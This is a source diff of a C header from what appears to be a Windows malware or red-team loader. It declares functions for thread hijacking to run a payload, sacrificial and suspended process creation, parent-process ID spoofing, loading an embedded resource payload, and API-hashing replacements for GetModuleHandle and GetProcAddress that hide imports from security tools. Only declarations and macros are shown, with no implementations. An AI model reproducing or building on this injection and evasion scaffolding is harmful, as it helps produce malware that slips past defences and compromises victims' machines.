@@ -3,12 +3,33 @@
 #include <Psapi.h>
 #include <stdlib.h>
 #include <TlHelp32.h>
-#include "Encryption.h"
-#include "Win32FindDataArray.h"
+
 #include <setupAPI.h>
 #include <winternl.h>
+#ifdef __cplusplus
+extern "C" {
+#endif
+
+#include "Encryption.h"
+
+#include "Win32FindDataArray.h"
 
 #include "resource.h"
+#ifdef __cplusplus
+}
+#endif
+
+#include "../HashingAPI.h"
+
+#include "CompileTimeHashEngine.h"
+
+#define HASHA(lpStringToHash, dwSeed)(HashStringJenkinsOneEachTime32BitA((LPSTR)(lpStringToHash), (DWORD)(dwSeed)))
+
+#define HASHW(lpStringToHash, dwSeed)(GenerateCompileTimeHashW((PWSTR)(lpStringToHash)))
+
+#define NtCustomCurrentProcess() ((HANDLE)-1) 
+#define NtCustomCurrentThread()  ((HANDLE)-2) 
+
 
 typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)
 (
@@ -20,7 +41,7 @@ typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)
 
 __kernel_entry NTSTATUS NTQuerySystemInformation
 (
-	IN              SYSTEM_INFORMATION_CLASS SystemInfomaionClass,
+	IN              SYSTEM_INFORMATION_CLASS SystemInformationClass,
 	IN OUT          PVOID                    SystemInformation,
 	IN              ULONG                    SystemInformationLength,
 	   OUT OPTIONAL PULONG                   ReturnLength
@@ -50,12 +71,18 @@ typedef struct _RESOURCE
 	PVOID  pAddress;
 	size_t sSize;
 
-}RESOURCE, * PRESOURCE;
+}RESOURCE, * pRESOURCE;
+
+BOOLEAN CreateLocalAlertableThread
+(
+       OUT PHANDLE phThread,
+	   OUT LPDWORD pdwThreadId
+);
 
 BOOLEAN CreateDebuggedProcess
 (
-	IN     PCHAR   pProcessName,
-	   OUT PDWORD  pdwProcessId,
+	IN     LPSTR   pProcessName,
+	   OUT LPDWORD pdwProcessId,
 	   OUT PHANDLE phProcessHandle,
 	   OUT PHANDLE phThreadHandle
 );
@@ -63,14 +90,13 @@ BOOLEAN CreateDebuggedProcess
 BOOLEAN CreateSuspendedProcess
 (
 	IN     PSTR    pProcessName,
-	   OUT PDWORD  pdwProcessId,
 	   OUT PHANDLE phProcessHandle,
 	   OUT PHANDLE phThreadHandle
 );
 
 BOOLEAN CreateSacrificialThread
 (
-	   OUT PDWORD  pdwSacrificialThreadId,
+	   OUT LPDWORD  pdwSacrificialThreadId,
 	   OUT PHANDLE phThreadHandle
 );
 
@@ -83,7 +109,7 @@ BOOLEAN HijackThread
 BOOLEAN HijackLocalThread
 (
 	IN     HANDLE hThread,
-	IN     PUCHAR pPayloadAdress,
+	IN     PUCHAR pPayloadAddress,
 	IN     SIZE_T sPayloadSize
 );
 
@@ -116,17 +142,14 @@ BOOLEAN FetchRemoteThreadHandle
 
 BOOLEAN FetchResource
 (
-	   OUT PRESOURCE pResource_t
+	   OUT pRESOURCE pResource_t
 );
 
 BOOLEAN FetchDrives
 (
 	IN OUT LPWSTR pPath
 );
-HMODULE GetModuleHandleReplacement
-(
-	IN    LPWSTR lpwTargetModuleName
-);
+
 
 BOOLEAN FetchProcessHandleHelpTool32
 (
@@ -199,10 +222,26 @@ UCHAR FetchImageHeaders
 	   OUT PPEB  *pPEB
 );
 
+HMODULE GetModuleHandleReplacement
+(
+	IN    LPWSTR lpwTargetModuleName
+);
+
+HMODULE GetModuleHandleReplacementH
+(
+	IN    DWORD dwTargetModuleName
+);
+
 FARPROC GetProcessAddressReplacement
 (
 	IN     HMODULE Target_hModule,
 	IN     LPSTR   lpTargetApiName
+);
+
+FARPROC GetProcessAddressReplacementH
+(
+	IN     HMODULE Target_hModule,
+	IN     DWORD   dwTargetApiHash
 );
 
 BOOLEAN SpoofParentProcessId
